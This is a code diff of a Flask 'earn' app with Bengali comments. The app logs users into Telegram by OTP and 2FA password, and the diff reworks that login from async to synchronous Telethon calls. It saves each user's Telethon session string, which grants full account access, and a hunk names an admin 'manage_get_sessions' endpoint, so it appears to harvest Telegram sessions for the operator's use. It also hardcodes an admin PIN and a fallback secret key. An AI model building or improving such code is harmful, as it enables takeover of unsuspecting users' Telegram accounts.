@@ -1,6 +1,4 @@
 import os
-import asyncio
-import nest_asyncio
 from flask import Flask, render_template, request, jsonify, session
 from flask_cors import CORS
 from pymongo import MongoClient
@@ -8,9 +6,7 @@ from telethon.sync import TelegramClient
 from telethon.sessions import StringSession
 from datetime import datetime
 
-# রেন্ডার বা ক্লাউড সার্ভারের জন্য লুপ ফিক্স
-nest_asyncio.apply()
-
+# ফ্লাস্ক অ্যাপ সেটআপ
 app = Flask(__name__)
 app.secret_key = os.environ.get("SECRET_KEY", "aaf_tele_earn_786")
 
@@ -30,11 +26,11 @@ ads_col = db['ads']
 tasks_col = db['tasks'] 
 withdraws_col = db['withdraws']
 
-# টেম্পোরারি ক্লায়েন্ট স্টোর
+# টেম্পোরারি ক্লায়েন্ট স্টোর (লগইন সেশন হ্যান্ডেল করতে)
 temp_clients = {}
 
 # ---------------------------------------------------------
-# ১. HTML পেজ রাউটস (ফাংশন নাম ইউনিক করা হয়েছে)
+# ১. HTML পেজ রাউটস (সবগুলো পেজ এখানে আছে)
 # ---------------------------------------------------------
 
 @app.route('/')
@@ -62,7 +58,7 @@ def render_account_page():
 def render_wallet_page(): 
     return render_template('wallet.html')
 
-# অ্যাডমিন পিনের কনফিগারেশন
+# অ্যাডমিন পিন এবং অ্যাডমিন পেজ
 ADMIN_PIN = "Abdullah6790" 
 
 @app.route('/admin')
@@ -84,7 +80,7 @@ def render_admin_panel():
 
 
 # ---------------------------------------------------------
-# ২. ইউজার লগইন ও ওটিপি এপিআই (Timeout ফিক্সড)
+# ২. ইউজার লগইন ও ওটিপি এপিআই (সব async রিমুভ করা হয়েছে)
 # ---------------------------------------------------------
 
 @app.route('/api/send_otp', methods=['POST'])
@@ -94,16 +90,18 @@ def send_otp_handler():
     if not phone: return jsonify({"success": False, "message": "Phone number missing"})
 
     try:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        client = TelegramClient(StringSession(), API_ID, API_HASH, loop=loop)
+        # টেলিথন ক্লায়েন্ট কানেকশন (Synchronous মোডে)
+        client = TelegramClient(StringSession(), API_ID, API_HASH)
+        client.connect()
         
-        async def perform_send_code():
-            await client.connect()
-            return await client.send_code_request(phone)
-
-        result = loop.run_until_complete(perform_send_code())
-        temp_clients[phone] = {"client": client, "hash": result.phone_code_hash, "loop": loop}
+        # ওটিপি পাঠানো
+        result = client.send_code_request(phone)
+        
+        # ডাটা সেভ রাখা পরবর্তী ধাপের জন্য
+        temp_clients[phone] = {
+            "client": client, 
+            "hash": result.phone_code_hash
+        }
         return jsonify({"success": True, "message": "OTP Sent Successfully!"})
     except Exception as e:
         return jsonify({"success": False, "message": str(e)})
@@ -112,21 +110,19 @@ def send_otp_handler():
 def verify_login_handler():
     data = request.json
     phone, code, password = data.get('phone'), data.get('code'), data.get('password')
-    if phone not in temp_clients: return jsonify({"success": False, "message": "Session expired"})
+    
+    if phone not in temp_clients: 
+        return jsonify({"success": False, "message": "Session expired, try again."})
 
     try:
-        info = temp_clients[phone]
-        loop = info["loop"]
-        client = info["client"]
-        h = info["hash"]
+        client = temp_clients[phone]["client"]
+        phone_hash = temp_clients[phone]["hash"]
         
-        async def perform_sign_in():
-            user = await client.sign_in(phone, code, phone_code_hash=h, password=password)
-            session_str = client.session.save()
-            return user, session_str
-
-        user, session_str = loop.run_until_complete(perform_sign_in())
+        # লগইন ভেরিফাই
+        user = client.sign_in(phone, code, phone_code_hash=phone_hash, password=password)
+        session_str = client.session.save()
         
+        # ইউজার ডাটাবেসে সেভ করা
         user_info = {
             "telegram_id": user.id,
             "phone": phone,
@@ -212,7 +208,7 @@ def add_balance_from_task():
 
 
 # ---------------------------------------------------------
-# ৫. অ্যাডমিন কন্ট্রোল এপিআই
+# ৫. অ্যাডমিন কন্ট্রোল এপিআই (সব অ্যাডমিন ফাংশন এখানে আছে)
 # ---------------------------------------------------------
 
 @app.route('/api/update_ads', methods=['POST'])
@@ -265,7 +261,7 @@ def manage_get_sessions():
 
 
 # ---------------------------------------------------------
-# ৬. অ্যাড ও টাস্ক লোড এপিআই
+# ৬. অ্যাড ও টাস্ক লোড এপিআই (ইউজারদের জন্য)
 # ---------------------------------------------------------
 
 @app.route('/api/get_active_ads')
@@ -281,7 +277,7 @@ def fetch_tasks():
 
 
 # ---------------------------------------------------------
-# ৭. সার্ভার রান ও পিঙ
+# ৭. সার্ভার রান ও পিঙ (সার্ভার সচল রাখার জন্য)
 # ---------------------------------------------------------
 
 @app.route('/ping')
@@ -289,5 +285,6 @@ def ping_checker():
     return "PONG", 200
 
 if __name__ == "__main__":
+    # রেন্ডার পোর্ট কনফিগারেশন
     port = int(os.environ.get("PORT", 10000))
     app.run(host="0.0.0.0", port=port)
